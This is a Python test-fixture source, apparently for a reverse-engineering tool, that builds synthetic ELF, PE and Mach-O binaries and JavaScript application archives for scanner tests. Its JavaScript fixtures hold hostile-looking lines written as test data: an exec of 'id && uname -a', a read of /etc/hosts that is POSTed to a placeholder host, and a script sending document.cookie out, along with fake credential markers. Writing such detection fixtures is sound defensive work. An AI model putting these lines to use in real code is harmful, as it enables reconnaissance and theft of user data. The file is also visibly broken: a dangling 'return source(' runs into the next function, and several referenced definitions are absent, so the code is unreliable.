```py
    data += bytes(shoff - len(data)) + b"".join(sections)
    return bytes(data), {"format": "elf", "entry": 0, "functions": [], "calls": [], "shoff": shoff,
                         "data": {"offset": data_offset, "address": base + data_offset, "size": len(payload)}}


def macho_code():
    """Thin little-endian x86_64 MH_EXECUTE: __PAGEZERO, __TEXT (r-x) with one __text section holding the code,
    __LINKEDIT with LC_SYMTAB (the four functions, N_SECT | N_EXT in section 1) and LC_DYSYMTAB, and LC_MAIN."""
    text, functions, calls = _code()
    base, text_offset = 0x100000000, 0x200
    text_address = base + text_offset

    def segment(name, vmaddr, vmsize, fileoff, filesize, prot, sections=b"", count=0):
        return struct.pack("<II16sQQQQiiII", 0x19, 72 + len(sections), name, vmaddr, vmsize, fileoff, filesize,
                           prot, prot, count, 0) + sections

    names = [name.encode() for name, _, _ in functions]
    strtab, offsets = _strtab(names)
    symbols = b"".join(struct.pack("<IBBHQ", offsets[name.encode()], 0x0F, 1, 0, text_address + offset)
                       for name, offset, _ in functions)
    linkedit = text_offset + TEXT_SIZE + (-(text_offset + TEXT_SIZE) % 8)
    section = struct.pack("<16s16sQQIIIIIIII", b"__text", b"__TEXT", text_address, TEXT_SIZE, text_offset, 4, 0, 0,
                          0x80000400, 0, 0, 0)  # S_ATTR_PURE_INSTRUCTIONS | S_ATTR_SOME_INSTRUCTIONS
    commands = [
        segment(b"__PAGEZERO", 0, base, 0, 0, 0),
        segment(b"__TEXT", base, 0x1000, 0, text_offset + TEXT_SIZE, 0x5, section, 1),
        segment(b"__LINKEDIT", base + 0x1000, 0x1000, linkedit, len(symbols) + len(strtab), 0x1),
        struct.pack("<IIIIII", 0x2, 24, linkedit, len(functions), linkedit + len(symbols), len(strtab)),  # LC_SYMTAB
        struct.pack("<II18I", 0xB, 80, 0, 0, 0, len(functions), len(functions), 0, *([0] * 12)),  # LC_DYSYMTAB
        struct.pack("<IIQQ", 0x80000028, 24, text_offset, 0),  # LC_MAIN: entry at __TEXT file offset text_offset
    ]
    header = struct.pack("<IiiIIIII", 0xFEEDFACF, 0x01000007, 3, 2, len(commands), sum(map(len, commands)), 0x1, 0)
    data = bytearray(header + b"".join(commands))
    assert len(data) <= text_offset
    data += bytes(text_offset - len(data)) + text
    data += bytes(linkedit - len(data)) + symbols + strtab
    layout = _layout(text_offset, text_address, functions, calls, named=True)
    layout.update(format="macho", image_base=base, section_names=["__TEXT,__text"], linkedit=linkedit)
    return bytes(data), layout


# The same four functions plus describe, with references into a data section.
REFS_FUNCTIONS = (("_start", 0x00), ("add_numbers", 0x20), ("compute", 0x30), ("constant", 0x50), ("describe", 0x60))
REFS_TEXT_SIZE = 0x86
DATA_SIZE = 0x50
GREETING, WIDE_GREETING = "ReverseAI ascii string", "ReverseAI wide"
# Name, offset inside the data section, size.
DATA_OBJECTS = (("greeting", 0x00, len(GREETING) + 1), ("wide_greeting", 0x20, 2 * len(WIDE_GREETING) + 2),
                ("counter", 0x40, 4), ("result", 0x48, 4))


def _data():
    data = bytearray(DATA_SIZE)
    data[0x00:0x00 + len(GREETING) + 1] = GREETING.encode("ascii") + b"\0"
    wide = WIDE_GREETING.encode("utf-16le") + b"\0\0"
    data[0x20:0x20 + len(wide)] = wide
    struct.pack_into("<I", data, 0x40, 7)
    return bytes(data)


def _refs_code(data_delta):
    """(.text, functions [(name, offset, size)], instructions {name: [(delta, length)]}, calls, refs) for the five
    functions; data_delta is the data section's address minus .text's (the RIP-relative displacements depend on it).
    calls are (from offset, call offset, target offset); refs are (from offset, offset, length, target offset from
    .text's address, access)."""
    starts, objects = dict(REFS_FUNCTIONS), {name: offset for name, offset, _ in DATA_OBJECTS}
    text = bytearray([PAD]) * REFS_TEXT_SIZE
    instructions, calls, refs = {}, [], []

    def put(name, *parts):
        offset = at = starts[name]
        rows = []
        for part in parts:
            if isinstance(part, bytes):
                encoded = part
            elif part[0] in ("call", "jmp"):  # ("call" or "jmp", target function)
                target = starts[part[1]]
                encoded = (b"\xe8" if part[0] == "call" else b"\xe9") + _rel32(at, 5, target)
                if part[0] == "call":
                    calls.append((offset, at, target))
                else:
                    refs.append((offset, at, 5, target, "jump"))
            else:  # (access, opcode, data object, immediate): a RIP-relative operand
                access, opcode, label, immediate = part
                length = len(opcode) + 4 + len(immediate)
                encoded = opcode + _rel32(at, length, data_delta + objects[label]) + immediate
                refs.append((offset, at, length, data_delta + objects[label], access))
            text[at:at + len(encoded)] = encoded
            rows.append((at - offset, len(encoded)))
            at += len(encoded)
        instructions[name] = rows
        return at - offset

    sizes = {
        "_start": put("_start", ("call", "add_numbers"), ("call", "compute"), ("call", "describe"), b"\xb8\x3c\x00\x00\x00",
                      b"\x31\xff", b"\x0f\x05", b"\xc3"),
        "add_numbers": put("add_numbers", b"\x55", b"\x48\x89\xe5", b"\x89\xf8", b"\x01\xf0", b"\x5d", b"\xc3"),
        "compute": put("compute", b"\x53", b"\xbf\x02\x00\x00\x00", b"\xbe\x03\x00\x00\x00", ("call", "add_numbers"),
                       b"\x89\xc3", ("call", "constant"), b"\x01\xd8", b"\x5b", b"\xc3"),
        "constant": put("constant", b"\xb8\x2a\x00\x00\x00", b"\xc3"),
        "describe": put("describe", ("data", b"\x48\x8d\x05", "greeting", b""), ("data", b"\x48\x8d\x15", "wide_greeting", b""),
                        ("read", b"\x8b\x0d", "counter", b""), ("write", b"\x89\x0d", "result", b""),
                        ("read_write", b"\x83\x05", "counter", b"\x01"), ("jmp", "constant")),
    }
    functions = [(name, offset, sizes[name]) for name, offset in REFS_FUNCTIONS]
    assert functions[-1][1] + functions[-1][2] == REFS_TEXT_SIZE
    return bytes(text), functions, instructions, calls, refs


def _refs_layout(text_offset, text_address, data_offset, data_address, functions, instructions, calls, refs, *, named):
    layout = _layout(text_offset, text_address, functions, calls, named=named)
    layout["text"]["size"] = REFS_TEXT_SIZE
    for row, (name, _, _) in zip(layout["functions"], functions):
        row["instructions"] = [list(item) for item in instructions[name]]
    starts = {offset: name for name, offset, _ in functions}
    objects = {data_address - text_address + offset: name for name, offset, _ in DATA_OBJECTS}
    layout["data"] = {"offset": data_offset, "address": data_address, "size": DATA_SIZE}
    layout["refs"] = [{"from": text_address + start, "address": text_address + at, "offset": text_offset + at, "length": length,
                       "to": text_address + target, "type": access,
                       "to_name": (starts.get(target) or objects[target]) if named else None}
                      for start, at, length, target, access in sorted(refs, key=lambda ref: ref[1])]
    describe = text_address + dict((name, offset) for name, offset, _ in functions)["describe"]
    layout["strings"] = [{"address": data_address + offset, "offset": data_offset + offset, "encoding": encoding, "text": text,
                          "length": len(text.encode(encoding)), "truncated": False, "from": [describe]}
                         for offset, encoding, text in ((0x00, "ascii", GREETING), (0x20, "utf-16le", WIDE_GREETING))]
    return layout


def elf_refs():
    """elf_code's layout plus .data: an R+X PT_LOAD over headers and .text, an R+W PT_LOAD over .data, and .symtab
    naming the five functions (FUNC, section 1) and the four data objects (OBJECT, section 2)."""
    base, text_offset, data_offset = 0x400000, 0x100, 0x200
    text_address, data_address = base + text_offset, base + 0x1000 + data_offset
    text, functions, instructions, calls, refs = _refs_code(data_address - text_address)
    names = [name.encode() for name, _, _ in functions] + [name.encode() for name, _, _ in DATA_OBJECTS]
    strtab, offsets = _strtab(names)
    symtab = bytes(24) + b"".join(
        struct.pack("<IBBHQQ", offsets[name.encode()], 0x12, 0, 1, text_address + offset, size) for name, offset, size in functions
    ) + b"".join(
        struct.pack("<IBBHQQ", offsets[name.encode()], 0x11, 0, 2, data_address + offset, size) for name, offset, size in DATA_OBJECTS)
    shstrtab, shnames = _strtab([b".text", b".data", b".symtab", b".strtab", b".shstrtab"])
    symtab_offset = data_offset + DATA_SIZE
    strtab_offset = symtab_offset + len(symtab)
    shstrtab_offset = strtab_offset + len(strtab)
    shoff = shstrtab_offset + len(shstrtab) + (-(shstrtab_offset + len(shstrtab)) % 8)
    sections = [bytes(64),
                struct.pack("<IIQQQQIIQQ", shnames[b".text"], 1, 0x6, text_address, text_offset, REFS_TEXT_SIZE, 0, 0, 16, 0),
                struct.pack("<IIQQQQIIQQ", shnames[b".data"], 1, 0x3, data_address, data_offset, DATA_SIZE, 0, 0, 8, 0),
                struct.pack("<IIQQQQIIQQ", shnames[b".symtab"], 2, 0, 0, symtab_offset, len(symtab), 4, 1, 8, 24),
                struct.pack("<IIQQQQIIQQ", shnames[b".strtab"], 3, 0, 0, strtab_offset, len(strtab), 0, 0, 1, 0),
                struct.pack("<IIQQQQIIQQ", shnames[b".shstrtab"], 3, 0, 0, shstrtab_offset, len(shstrtab), 0, 0, 1, 0)]
    layout = _refs_layout(text_offset, text_address, data_offset, data_address, functions, instructions, calls, refs, named=True)
    header = (b"\x7fELF" + bytes([2, 1, 1, 0]) + bytes(8)
              + struct.pack("<HHIQQQIHHHHHH", 2, 62, 1, layout["entry"], 64, shoff, 0, 64, 56, 2, 64, len(sections), 5))
    loads = (struct.pack("<IIQQQQQQ", 1, 0x5, 0, base, base, text_offset + REFS_TEXT_SIZE, text_offset + REFS_TEXT_SIZE, 0x1000)
             + struct.pack("<IIQQQQQQ", 1, 0x6, data_offset, data_address, data_address, DATA_SIZE, DATA_SIZE, 0x1000))
    data = bytearray(header + loads)
    data += bytes(text_offset - len(data)) + text
    data += bytes(data_offset - len(data)) + _data() + symtab + strtab + shstrtab
    data += bytes(shoff - len(data)) + b"".join(sections)
    layout.update(format="elf", image_base=base, shoff=shoff, section_names=[".text", ".data", ".symtab", ".strtab", ".shstrtab"])
    return bytes(data), layout


def pe_refs():
    """pe_code's layout with the five functions in .text and the strings and dwords in .data; no symbols, no imports."""
    image_base, lfanew, file_alignment = 0x140000000, 0x40, 0x200
    text_rva, data_rva, text_offset, data_offset = 0x1000, 0x2000, 0x200, 0x400
    text, functions, instructions, calls, refs = _refs_code(data_rva - text_rva)
    sections = (struct.pack("<8sIIIIIIHHI", b".text", REFS_TEXT_SIZE, text_rva, file_alignment, text_offset, 0, 0, 0, 0, 0x60000020)
                + struct.pack("<8sIIIIIIHHI", b".data", DATA_SIZE, data_rva, file_alignment, data_offset, 0, 0, 0, 0, 0xC0000040))
    coff = struct.pack("<HHIIIHH", 0x8664, 2, 0x5F5E1000, 0, 0, 240, 0x22)
    optional = struct.pack("<HBBIIIIIQIIHHHHHHIIIIHHQQQQII", 0x20B, 14, 0, file_alignment, file_alignment, 0,
                           text_rva, text_rva, image_base, 0x1000, file_alignment, 6, 0, 0, 0, 6, 0, 0,
                           0x3000, 0x200, 0, 3, 0, 0x100000, 0x1000, 0x100000, 0x1000, 0, 16) + bytes(16 * 8)
    assert len(optional) == 240
    data = bytearray(b"MZ" + bytes(0x3A) + struct.pack("<I", lfanew))
    data += b"PE\0\0" + coff + optional + sections
    data += bytes(text_offset - len(data)) + text + bytes(file_alignment - REFS_TEXT_SIZE)
    data += _data() + bytes(file_alignment - DATA_SIZE)
    layout = _refs_layout(text_offset, image_base + text_rva, data_offset, image_base + data_rva, functions, instructions, calls, refs,
                          named=False)
    layout.update(format="pe", image_base=image_base, section_names=[".text", ".data"], text_raw_size=file_alignment)
    return bytes(data), layout


def macho_refs():
    """macho_code's layout with the five functions in __TEXT,__text and the strings and dwords in __DATA,__data (rw-);
    LC_SYMTAB names the functions (section 1) and the data objects (section 2)."""
    base, text_offset, data_offset = 0x100000000, 0x300, 0x400
    text_address, data_address = base + text_offset, base + 0x1000
    text, functions, instructions, calls, refs = _refs_code(data_address - text_address)

    def segment(name, vmaddr, vmsize, fileoff, filesize, prot, sections=b"", count=0):
        return struct.pack("<II16sQQQQiiII", 0x19, 72 + len(sections), name, vmaddr, vmsize, fileoff, filesize,
                           prot, prot, count, 0) + sections

    names = [name.encode() for name, _, _ in functions] + [name.encode() for name, _, _ in DATA_OBJECTS]
    strtab, offsets = _strtab(names)
    symbols = b"".join(struct.pack("<IBBHQ", offsets[name.encode()], 0x0F, 1, 0, text_address + offset)
                       for name, offset, _ in functions)
    symbols += b"".join(struct.pack("<IBBHQ", offsets[name.encode()], 0x0F, 2, 0, data_address + offset)
                        for name, offset, _ in DATA_OBJECTS)
    linkedit = data_offset + DATA_SIZE
    text_section = struct.pack("<16s16sQQIIIIIIII", b"__text", b"__TEXT", text_address, REFS_TEXT_SIZE, text_offset, 4, 0, 0,
                               0x80000400, 0, 0, 0)  # S_ATTR_PURE_INSTRUCTIONS | S_ATTR_SOME_INSTRUCTIONS
    data_section = struct.pack("<16s16sQQIIIIIIII", b"__data", b"__DATA", data_address, DATA_SIZE, data_offset, 3, 0, 0, 0, 0, 0, 0)
    count = len(functions) + len(DATA_OBJECTS)
    commands = [
        segment(b"__PAGEZERO", 0, base, 0, 0, 0),
        segment(b"__TEXT", base, 0x1000, 0, text_offset + REFS_TEXT_SIZE, 0x5, text_section, 1),
        segment(b"__DATA", data_address, 0x1000, data_offset, DATA_SIZE, 0x3, data_section, 1),
        segment(b"__LINKEDIT", base + 0x2000, 0x1000, linkedit, len(symbols) + len(strtab), 0x1),
        struct.pack("<IIIIII", 0x2, 24, linkedit, count, linkedit + len(symbols), len(strtab)),  # LC_SYMTAB
        struct.pack("<II18I", 0xB, 80, 0, 0, 0, count, count, 0, *([0] * 12)),  # LC_DYSYMTAB
        struct.pack("<IIQQ", 0x80000028, 24, text_offset, 0),  # LC_MAIN: entry at __TEXT file offset text_offset
    ]
    header = struct.pack("<IiiIIIII", 0xFEEDFACF, 0x01000007, 3, 2, len(commands), sum(map(len, commands)), 0x1, 0)
    data = bytearray(header + b"".join(commands))
    assert len(data) <= text_offset
    data += bytes(text_offset - len(data)) + text
    data += bytes(data_offset - len(data)) + _data()
    data += symbols + strtab
    layout = _refs_layout(text_offset, text_address, data_offset, data_address, functions, instructions, calls, refs, named=True)
    layout.update(format="macho", image_base=base, section_names=["__TEXT,__text", "__DATA,__data"], linkedit=linkedit)
    return bytes(data), layout

```

`tests/fixtures_js.py`:

```py
"""Deterministic JavaScript application fixtures; bytes built in code, never real samples.

app_zip() builds a small application archive from declared values, members in central directory order:

    node_modules/left-pad/package.json  deflated; a deeper package.json, never the default one
    node_modules/left-pad/index.js      deflated; the bundled dependency's code
    package.json                        deflated npm manifest with every field the contract lists, and some it does
                                        not (APP_PACKAGE)
    lib/index.js                        deflated CommonJS entry: child_process, fs, an https URL, fetch
    lib/loader.mjs                      stored ES module: eval, new Function, WebSocket, a dynamic import
    src/config.ts                       deflated TypeScript with CRLF line ends: a fake AWS access key id, a private
                                        key block marker, base64 through Buffer.from and atob, a non-ASCII comment
    dist/app.min.js                     deflated; one minified line without a final line feed, the longest line
    lib/util.cjs                        deflated
    lib/Legacy.JS                       deflated; the suffix rule is ASCII case-insensitive
    README.md                           deflated; not a JavaScript file, so never scanned

bundle_js() is one file that is not a ZIP: a webpack-like bundle on one long line, then a source map comment.
package_only() is the app's package.json alone, a single-file input for js.package (file "").
js_edge(kind) builds the clean edge cases of EDGE_KINDS, js_hostile(kind) the problems of HOSTILE_KINDS;
INVALID_JSON names package.json texts a strict RFC 8259 reader refuses, and package_zip(text) puts any of them in an
application ZIP; nested_json(depth) is an object nested to an exact depth for boundary tests.

Each builder returns (data, layout):

    layout["files"]     the JavaScript files by the contract rule (names ending in .js, .mjs, .cjs, .jsx, .ts or
                        .tsx, ASCII case-insensitive, plus package.json; central directory order), each with the
                        js.files row it must produce ("row", including flags), its anchor inside the child and the
                        member's artifact; flagged files instead cite their central entry and have no artifact
    layout["packages"]  every package.json built from declared values, by member name, as layout["package"] is
    layout["package"]   the default package.json (fewest path segments, first in central directory order on a tie):
                        the js.package rows in document order, each with its anchor (offset and length inside the
                        child, quotes included, at most 4,096), and every string value of the document with its JSON
                        pointer and token span ("strings")
    layout["marks"]     per file, named spans of hint-worthy text (labels of this module, not jshints pattern names),
                        so hint tests can pin their own exact matches
    layout["expect"]    hostile and edge cases only: what each js operation must do ("ok", "refused" for a failed
                        operation, "no rows")

Conventions: `lines` counts line feeds, plus one when the last byte is not a line feed (0 when empty);
max_line is the longest run of bytes between line feeds, a carriage return counting as
a byte; JSON depth counts the containers on the path, the outermost included (a bare {} has depth 1); the exports depth
counts the pointer segments after /exports (/exports/./import/node is 3); paths are JSON pointers of the decoded keys
(~ as ~0, / as ~1); values and paths are escaped like import names (printable ASCII as is but the backslash, every
other code point as \\xNN, \\uNNNN or \\UNNNNNNNN) and cut at 256 characters of the escaped text, an escape possibly
split. Secret-looking texts (an AWS access key id, a private key block) are fakes assembled at run time from
fragments, so this source holds no literal a secret scanner would flag.
"""

from __future__ import annotations

import hashlib
import json
import struct

from tests import fixtures_apk as F

JS_SUFFIXES = (".js", ".mjs", ".cjs", ".jsx", ".ts", ".tsx")
INSTALL_SCRIPTS = ("preinstall", "install", "postinstall", "prepare")  # npm runs these on install
MAX_ANCHOR = 4096
MAX_TEXT = 256
MAX_JSON_BYTES = 1024 * 1024
MAX_JSON_DEPTH = 64
MAX_EXPORTS_DEPTH = 4
TOP_FIELDS = ("name", "version", "description", "main", "module", "browser", "types", "type", "license", "homepage")
NESTED_FIELDS = ("bin", "scripts", "engines", "dependencies", "devDependencies", "peerDependencies",
                 "optionalDependencies")
BUNDLED_FIELDS = ("bundledDependencies", "bundleDependencies")
# Documented fake values, assembled here so the source holds no secret-looking literal
FAKE_AWS_KEY_ID = "AKIA" + "IOSFODNN7" + "EXAMPLE"
PRIVATE_KEY_BEGIN, PRIVATE_KEY_END = "-----BEGIN " + "PRIVATE KEY-----", "-----END " + "PRIVATE KEY-----"
FAKE_KEY_BODY = "MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7" + "AgEAAkEAreverseaifixturenotakey00"


# ---- expectations shared by every builder ----

def escaped(text):
    """Import-name escaping: printable ASCII as is but the backslash, every other code point as an escape."""
    return "".join(char if " " <= char <= "~" and char != "\\" else
                   ("\\x%02x" if ord(char) <= 0xFF else "\\u%04x" if ord(char) <= 0xFFFF else "\\U%08x") % ord(char)
                   for char in text)


def cut(text):
    """(escaped text cut at 256 characters, whether it was cut)."""
    full = escaped(text)
    return full[:MAX_TEXT], len(full) > MAX_TEXT


def line_metrics(data):
    """(lines, max_line) by the conventions above."""
    if not data:
        return 0, 0
    return data.count(b"\n") + (not data.endswith(b"\n")), max(len(line) for line in data.split(b"\n"))


def is_javascript(name):
    lowered = name.encode("utf-8", "surrogateescape").lower()
    return lowered.endswith(tuple(s.encode() for s in JS_SUFFIXES)) or name.rsplit("/", 1)[-1] == "package.json"


def source(*parts, newline="\n"):
    """(bytes, marks) of lines of text; a (label, text) part inside a line is recorded as a mark at its byte offset.

    parts are lines: a str, or a tuple of str and (label, text) pieces joined without separators."""
    out, marks = bytearray(), []
    for line in parts:
        for piece in (line,) if isinstance(line, str) else line:
            label, text = piece if isinstance(piece, tuple) else (None, piece)
            raw = text.encode("utf-8")
            if label:
                marks.append({"label": label, "text": text, "offset": len(out), "length": len(raw)})
            out += raw
        out += newline.encode()
    return bytes(out), marks


def json_text(value):
    """(bytes, strings) of value as JSON indented by two spaces (keys in the given order, non-ASCII as \\u escapes,
    a final line feed); strings lists every string value with its JSON pointer, the byte span of its token, quotes
    included, and the decoded text."""
    out, strings = [], []
    at = 0

    def put(text):
        nonlocal at
        out.append(text)
        at += len(text)  # ASCII only, so characters are bytes

    def emit(item, pointer, depth):
        if isinstance(item, (dict, list)) and item:
            pairs = list(item.items()) if isinstance(item, dict) else list(enumerate(item))
            put("{\n" if isinstance(item, dict) else "[\n")
            for i, (key, child) in enumerate(pairs):
                put("  " * (depth + 1) + (json.dumps(key) + ": " if isinstance(item, dict) else ""))
                emit(child, pointer + "/" + str(key).replace("~", "~0").replace("/", "~1"), depth + 1)
                put(",\n" if i + 1 < len(pairs) else "\n")
            put("  " * depth + ("}" if isinstance(item, dict) else "]"))
        elif isinstance(item, str):
            token = json.dumps(item)
            strings.append({"pointer": pointer, "offset": at, "length": len(token), "value": item})
            put(token)
        else:
            put(json.dumps(item))

    emit(value, "", 0)
    put("\n")
    return "".join(out).encode("ascii"), strings


def listed(pointer):
    """Whether js.package lists the string at this pointer."""
    segments = pointer.split("/")[1:]
    if not segments or not segments[0]:
        return False
    first = segments[0]
    if len(segments) == 1:
        return first in TOP_FIELDS + ("repository", "bin", "exports")
    if first == "repository":
        return segments == ["repository", "url"]
    if first == "exports":
        return len(segments) - 1 <= MAX_EXPORTS_DEPTH
    if first in BUNDLED_FIELDS:
        return len(segments) == 2
    return first in NESTED_FIELDS


def package_rows(strings, file):
    rows = []
    for item in strings:
        if listed(item["pointer"]):
            value, truncated = cut(item["value"])
            rows.append({"row": {"file": file, "path": escaped(item["pointer"]), "value": value, "truncated": truncated},
                         "offset": item["offset"], "length": min(item["length"], MAX_ANCHOR)})
    return rows


def _segments(name):
    return len(name.split("/"))


def archive(specs, *, strings=None, marks=None):
    """(data, layout) of an application ZIP; specs are fixtures_apk.member() dicts, strings and marks by name."""
    data, zipped = F.zip_archive(specs)
    files = []
    for row in zipped["members"]:
        child = specs[row["index"]]["data"]
        if not is_javascript(row["name"]):
            continue
        lines, max_line = line_metrics(child)
        # an empty member is anchored at its central directory entry in the input, without an artifact
        anchor = ({"offset": 0, "length": min(len(child), MAX_ANCHOR)} if child else
                  {"offset": row["central_offset"], "length": row["central_length"]})
        files.append({"member": row["index"], "name": row["name"], "data": child,
                      "artifact": row["artifact"] if child else None, "anchor": anchor,
                      "row": {"file": escaped(row["name"]), "size": len(child), "sha256": hashlib.sha256(child).hexdigest(),
                              "lines": lines, "max_line": max_line, "flags": []}})
    manifests = [f for f in files if f["name"].rsplit("/", 1)[-1] == "package.json"]
    default = min(manifests, key=lambda f: (_segments(f["name"]), f["member"])) if manifests else None
    packages = {f["name"]: {"name": f["name"], "member": f["member"], "artifact": f["artifact"],
                            "rows": package_rows(strings[f["name"]], f["row"]["file"]), "strings": strings[f["name"]]}
                for f in manifests if f["name"] in (strings or {})}
    return data, {"size": len(data), "sha256": hashlib.sha256(data).hexdigest(), "zip": zipped, "files": files,
                  "packages": packages, "package": packages.get(default["name"]) if default else None,
                  "default_package": default["name"] if default else None,
                  "marks": {name: found for name, found in (marks or {}).items()}}


def single(data, *, strings=None, marks=()):
    """(data, layout) of a single-file input, named "" in rows; an empty input has no rows."""
    lines, max_line = line_metrics(data)
    files = [{"member": None, "name": "", "data": data, "artifact": None,
              "anchor": {"offset": 0, "length": min(len(data), MAX_ANCHOR)},
              "row": {"file": "", "size": len(data), "sha256": hashlib.sha256(data).hexdigest(), "lines": lines,
                      "max_line": max_line, "flags": []}}] if data else []
    package = None if strings is None else {"name": "", "member": None, "artifact": None,
                                            "rows": package_rows(strings, ""), "strings": strings}
    return data, {"size": len(data), "sha256": hashlib.sha256(data).hexdigest(), "zip": None, "files": files,
                  "packages": {} if package is None else {"": package}, "package": package,
                  "default_package": "" if strings is not None else None,
                  "marks": {"": list(marks)}}

def _index_js():
    return source(
        "'use strict';",
        "// Fixture entry point (CommonJS), built in code for ReverseAI tests; never run",
        ("const { exec } = ", ("require_child_process", "require('child_process')"), ";"),
        ("const fs = ", ("require_fs", "require('fs')"), ";"),
        ("const ENDPOINT = '", ("url_https", "https://api.example.com/v1/collect"), "';"),
        "function setup() {",
        ("  ", ("exec_call", "exec("), "'id && uname -a', () => {});"),
        ("  const hosts = ", ("read_file", "fs.readFileSync("), "'", ("path_etc", "/etc/hosts"), "', 'utf8');"),
        ("  return ", ("fetch_call", "fetch("), "ENDPOINT, { method: 'POST', body: hosts });"),
        "}",
        "module.exports = { setup };",
    )

    return source(

def _app_min_js():
    functions = ";".join(f"function f{i}(a,b){{return a*{i}+b}}" for i in range(40))
    data, marks = source(("!function(){", functions, ";var x=", ("xhr", "new XMLHttpRequest("), ");x.open('POST','",
                          ("url_https", "https://telemetry.example.com/t"), "');x.send(", ("document_cookie", "document.cookie"),
                          ");", ("local_storage", "localStorage"), ".setItem('k','v')}();"))
    return data[:-1], marks  # one line without a final line feed


def app_zip():
    package, strings = json_text(APP_PACKAGE)
    left_pad, left_pad_strings = json_text(LEFT_PAD_PACKAGE)
    index, index_marks = _index_js()
    loader, loader_marks = _loader_mjs()
    config, config_marks = _config_ts()
    minified, minified_marks = _app_min_js()
    util, util_marks = source(("module.exports = { now: () => ", ("date_now", "Date.now()"), " };"))
    legacy, _ = source("var legacy = 1;")
    readme, _ = source("# Fixture app", "", "Not JavaScript: eval( and https://docs.example.com/ here are never scanned.")
    left_pad_index, _ = source("module.exports = function leftPad(s, n) { return String(s).padStart(n); };")
    specs = [F.member("node_modules/left-pad/package.json", left_pad), F.member("node_modules/left-pad/index.js",
                                                                              left_pad_index),
             F.member("package.json", package), F.member("lib/index.js", index), F.member("lib/loader.mjs", loader, 0),
             F.member("src/config.ts", config), F.member("dist/app.min.js", minified), F.member("lib/util.cjs", util),
             F.member("lib/Legacy.JS", legacy), F.member("README.md", readme)]
    return archive(specs, strings={"package.json": strings, "node_modules/left-pad/package.json": left_pad_strings},
                   marks={"lib/index.js": index_marks, "lib/loader.mjs": loader_marks, "src/config.ts": config_marks,
                          "dist/app.min.js": minified_marks, "lib/util.cjs": util_marks})

# ---- edge and hostile cases ----

EDGE_KINDS = ("long_value", "package_tie", "empty_file", "empty_input")
HOSTILE_KINDS = ("duplicate_key", "duplicate_nested_key", "invalid_json", "deep_nesting", "huge_string", "non_utf8",
                 "long_pointer", "flagged_members", "declared_over_128mib", "zip_refused")
INVALID_JSON = {
    "trailing_comma": b'{"name": "a",}',
    "single_quotes": b"{'name': 'a'}",
    "comment": b'{"name": "a" // note\n}',
    "nan": b'{"version": NaN}',
    "control_character": b'{"name": "a\tb"}',
    "lone_surrogate": b'{"name": "\\ud800"}',
    "bad_escape": b'{"name": "\\q"}',
    "leading_zero": b'{"version": 01}',
    "truncated": b'{"name": "a"',
    "two_values": b'{"name": "a"} {}',
    "empty": b"",
    "bare_word": b"package",
    "byte_order_mark": b'\xef\xbb\xbf{"name": "a"}',  # A UTF-8 BOM is refused
    "top_level_array": b'["name"]',  # the file must hold one JSON object
    "top_level_string": b'"name"',
}
INDEX_JS = b"module.exports = 1;\n"


def nested_json(depth):
    """{"a": [[...]]} with exactly depth containers on the innermost path, the outer object counted."""
    if depth < 1:
        raise ValueError("depth starts at 1")
    return b'{"a": ' + b"[" * (depth - 1) + b"]" * (depth - 1) + b"}" if depth > 1 else b"{}"


def package_zip(text, *, method=8, extra=()):
    """An application ZIP of package.json with these exact bytes, lib/index.js and any extra members."""
    return archive([F.member("package.json", text, method), F.member("lib/index.js", INDEX_JS), *extra])


def js_edge(kind):
    if kind == "long_value":
        # A value longer than both the 256-character cut and the 4,096-byte anchor
        data, strings = json_text({"name": "long", "description": "d" * 5000 + "\u00e9"})
        built = archive([F.member("package.json", data)], strings={"package.json": strings})
        built[1]["expect"] = {"js.package": "ok"}
        return built
    if kind == "package_tie":
        # Same segment count: the first in central directory order is the default, whatever its name
        first, first_strings = json_text({"name": "second-by-name"})
        second, second_strings = json_text({"name": "first-by-name"})
        built = archive([F.member("b/package.json", first), F.member("a/package.json", second)],
                        strings={"b/package.json": first_strings, "a/package.json": second_strings})
        built[1]["expect"] = {"js.package": "ok", "default": "b/package.json"}
        return built
    if kind == "empty_file":
        # An empty member is anchored at its central directory entry, without an artifact
        built = archive([F.member("lib/empty.js", b"", 0), F.member("lib/index.js", INDEX_JS)])
        built[1]["expect"] = {"js.files": "ok", "js.hints": "ok"}
        return built
    if kind == "empty_input":
        # An empty single-file input has no rows
        built = single(b"")
        built[1]["expect"] = {"js.files": "no rows", "js.hints": "no rows"}
        return built
    raise ValueError(f"unknown edge kind {kind!r}")


def _flagged_files(layout, flags):
    layout["flags"] = flags
    for file in layout["files"]:
        member = layout["zip"]["members"][file["member"]]
        refused = flags[file["member"]]
        if refused:
            file.update(artifact=None, anchor={"offset": member["central_offset"],
                                              "length": min(member["central_length"], MAX_ANCHOR)})
            file["row"].update(file=escaped(file["name"])[:255], size=member["size"], sha256=None,
                               lines=None, max_line=None, flags=refused)


def js_hostile(kind):
    """(data, layout) of one problem; layout["expect"] maps each js operation to "ok", "refused" or "no rows"."""
    if kind == "duplicate_key":
        built = package_zip(b'{\n  "name": "a",\n  "name": "b"\n}\n')
    elif kind == "duplicate_nested_key":
        built = package_zip(b'{"name": "a", "dependencies": {"left-pad": "1.0.0", "left-pad": "9.9.9"}}\n')
    elif kind == "invalid_json":
        built = package_zip(INVALID_JSON["trailing_comma"])
    elif kind == "deep_nesting":
        # Far past depth 64: a recursive reader without a bound would overflow its stack
        built = package_zip(nested_json(100_000), method=0)
    elif kind == "huge_string":
        # One string makes the document a byte longer than the 1 MiB the reader accepts
        head, tail = b'{"name": "huge", "description": "', b'"}\n'
        built = package_zip(head + b"x" * (MAX_JSON_BYTES + 1 - len(head) - len(tail)) + tail, method=0)
    elif kind == "non_utf8":
        latin1, marks = source(("var s = \"caf", ("raw_byte", "\u00e9"), "\";"),
                               ("fetch(\"", ("url_https", "https://latin1.example.com/x"), "\");"))
        latin1 = latin1.replace("\u00e9".encode(), b"\xe9")  # one byte shorter: offsets after it move back by one
        for mark in marks:
            if mark["label"] == "raw_byte":
                mark.update(length=1, text=None, bytes=b"\xe9")
            elif mark["offset"] > marks[0]["offset"]:
                mark["offset"] -= 1
        built = package_zip(b'{"name": "caf\xe9"}\n', extra=(F.member("lib/latin1.js", latin1),))
        built[1]["marks"] = {"lib/latin1.js": marks}
        built[1]["expect"] = {"js.files": "ok", "js.package": "refused", "js.hints": "ok"}
        return built
    elif kind == "long_pointer":
        # A JSON pointer longer than 255 characters fails js.package
        built = package_zip(b'{"name": "a", "dependencies": {"' + b"k" * 300 + b'": "1.0.0"}}\n')
    elif kind == "flagged_members":
        # All JS names are listed; flagged members are never read.
        package, strings = json_text({"name": "flagged"})
